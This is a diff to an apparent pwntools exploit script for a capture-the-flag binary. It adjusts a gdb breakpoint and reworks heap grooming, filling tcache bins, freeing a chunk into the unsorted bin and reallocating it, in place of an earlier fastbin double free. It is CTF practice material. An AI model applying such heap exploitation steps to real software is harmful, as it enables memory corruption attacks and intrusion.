@@ -8,7 +8,7 @@ bin = ELF("./chall/app")
 
 p = process("./chall/app")
 pid = gdb.attach(p, gdbscript="""
-b * eton + 878
+b * eton + 895
 """)
 #p = remote("localhost", 1337)
 
@@ -25,17 +25,15 @@ p.sendline(payload_1)
 
 # heap stuff
 # tcachebins
-malloc(p, b"0", b" AAAAAAAA")
-malloc(p, b"1", b" BBBBBBBB")
-malloc(p, b"2", b" CCCCCCCC")
-malloc(p, b"3", b" DDDDDDDD")
-malloc(p, b"4", b" EEEEEEEE")
-malloc(p, b"5", b" FFFFFFFF")
-malloc(p, b"6", b" GGGGGGGG")
+malloc(p, b"0", b" " + 130 * b"A")
+malloc(p, b"1", b" " + 130 * b"A")
+malloc(p, b"2", b" " + 130 * b"A")
+malloc(p, b"3", b" " + 130 * b"A")
+malloc(p, b"4", b" " + 130 * b"A")
+malloc(p, b"5", b" " + 130 * b"A")
+malloc(p, b"6", b" " + 130 * b"A")
 
-# fastbins
-malloc(p, b"7", b" HHHHHHHH")
-malloc(p, b"8", b" IIIIIIII")
+malloc(p, b"7", b" " + 130 * b"B")
 
 free(p, b"0")
 free(p, b"1")
@@ -45,8 +43,10 @@ free(p, b"4")
 free(p, b"5")
 free(p, b"6")
 
-free(p, b"7")
-free(p, b"7")
+free(p, b"7")  # goes to unsorted
+
+malloc(p, b"0", b"\x00")
+
 
 #malloc(p)
 #malloc(p)
